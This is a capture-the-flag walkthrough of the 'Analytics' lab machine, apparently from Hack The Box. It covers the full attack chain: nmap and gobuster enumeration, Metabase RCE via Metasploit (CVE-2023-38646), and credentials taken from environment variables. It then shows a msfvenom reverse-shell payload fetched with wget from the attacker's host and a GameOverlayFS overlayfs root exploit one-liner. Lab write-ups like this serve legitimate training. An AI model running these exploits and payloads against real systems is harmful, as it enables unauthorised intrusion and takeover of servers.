@@ -1,0 +1,197 @@
+
+Analytics - Multiple CVEs, Exposed sensitive files, 
+
+
+Enumeration
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.243.41
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://analytical.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+http://analytical.htb/
+
+echo 10.129.243.41 analytical.htb | sudo tee -a /etc/hosts
+
+
+Seems to be a static web server
+http://analytical.htb/#contact 
+
+
+http://data.analytical.htb/  takes us to the login page
+
+echo 10.129.243.41 data.analytical.htb | sudo tee -a /etc/hosts
+
+gobuster dir -u http://data.analytical.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+gobuster dir -u http://analytical.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+While that is running, let’s see if we can try some credentials to intercept HTTP on burp suite on login page. 
+
+
+Request:
+POST /api/session HTTP/1.1
+Host: data.analytical.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://data.analytical.htb/auth/login?redirect=%2F
+Content-Type: application/json
+Content-Length: 68
+Origin: http://data.analytical.htb
+DNT: 1
+Connection: close
+Cookie: metabase.DEVICE=b2d56c1a-87b8-4473-8617-47a37d09fb03
+Sec-GPC: 1
+
+{"username":"hello@gmail.com","password":"password","remember":true}
+
+
+We can see the server is using metabase service
+curl http://data.analytical.htb/ | grep version
+
+Version":{"date":"2023-06-29","tag":"v0.46.6",
+
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38646 
+
+Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow attackers to execute arbitrary commands on the server, at the server's privilege level. Authentication is not required for exploitation. The other fixed versions are 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, and 1.43.7.2.
+
+[msf](Jobs:0 Agents:0) >> search metabase
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE
+
+
+use 0
+set RHOST http://data.analytical.htb/
+Run
+
+We are in metabase server
+
+Let’s try to stabilize:
+
+shell
+[*] Trying to find binary 'python' on the target machine
+[-] python not found
+[*] Trying to find binary 'python3' on the target machine
+[-] python3 not found
+[*] Trying to find binary 'script' on the target machine
+[-] script not found
+[*] Trying to find binary 'socat' on the target machine
+[-] socat not found
+[-] Can not pop up an interactive shell
+
+
+Can’t stabilize 
+
+find . -name "*.txt" 2>/dev/null
+
+This shows us that user.txt isn’t here
+
+
+
+Environment Variable Enumeration:
+
+printenv
+
+We found:
+META_PASS=An4lytics_ds20223#
+LANG=en_US.UTF-8
+MB_LDAP_PASSWORD=
+SHELL=/bin/sh
+MB_EMAIL_SMTP_USERNAME=
+MB_DB_USER=
+META_USER=metalytics
+
+We use this for SSH and found user flag:
+
+metalytics@analytics:~$ cat user.txt
+3dd9d5530bd38fc70acc600ecb0f564c
+
+
+Privilege Escalation:
+metalytics@analytics:~$ sudo -l
+[sudo] password for metalytics: 
+Sorry, user metalytics may not run sudo on localhost.
+
+Let’s get this on msfconsole
+
+On attack:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.206 LPORT=4444 -f elf -o reverse.elf
+python3 -m http.server 7001
+msfconsole 
+use exploit/multi/handler
+set payload payload/linux/x86/meterpreter/reverse_tcp
+run
+
+On ssh connection of metalytics:
+wget http://10.10.14.206:7001/reverse.elf
+chmod +x reverse.elf
+ ./reverse.elf
+
+
+Results after running post/multi/recon/local_exploit_suggester
+
+lly Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+
+Description:
+  This module attempts to create a new login session by
+  invoking the su command of a valid username and password.
+
+  If the login is successful, a new session is created via
+  the specified payload.
+
+  Because su forces passwords to be passed over stdin, this
+  module attempts to invoke a psuedo-terminal with python,
+  python3, or script.
+
+This did not work:
+
+[msf](Jobs:0 Agents:1) exploit(linux/local/su_login) >> run
+
+[*] Started reverse TCP handler on 10.10.14.206:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] Uploading payload to target
+[*] Attempting to login with su
+[*] Exploit completed, but no session was created.
+
+metalytics@analytics:~$ uname -a
+Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+
+
+^Cmetalytics@analytics:~$ lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 22.04.3 LTS
+Release:	22.04
+Codename:	jammy
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2640 
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32629 
+
+
+We see that the above shows two CVE’s, we can use this PoC script that was created:
+https://github.com/luanoliveira350/GameOverlayFS 
+
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
+setcap cap_setuid+eip l/python3;mount -t overlay overlay -o
+rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import
+os;os.setuid(0);os.system("/bin/bash")'
+
+root@analytics:/root# cat root.txt
+87826d6101e0e29d6c2951d91091ea3c
+
+Now we have root access
